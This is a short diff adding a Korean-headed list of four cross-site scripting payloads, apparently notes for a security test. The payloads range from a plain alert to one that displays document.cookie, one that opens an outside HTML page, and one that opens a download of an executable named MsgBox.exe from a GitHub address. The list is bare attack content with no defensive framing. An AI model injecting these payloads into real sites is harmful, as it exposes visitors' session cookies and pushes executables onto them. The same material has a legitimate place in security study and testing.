@@ -1,0 +1,21 @@
+ 3) XSS 인젝션
+
+ ① 
+
+<script>alert("test1")</script>
+
+
+ ② 
+
+<script>alert(document.cookie)</script>
+
+
+ ③ 
+
+<script>window.open("https://blog.kakaocdn.net/dn/nHIt5/btrVErigVlJ/YLoHAk1zKMF6ZutujjZ8qK/tfile.html")</script>
+
+
+ ④ 
+
+<script>window.open("https://github.com/ncs10322/security/raw/main/MsgBox.exe")</script>
+
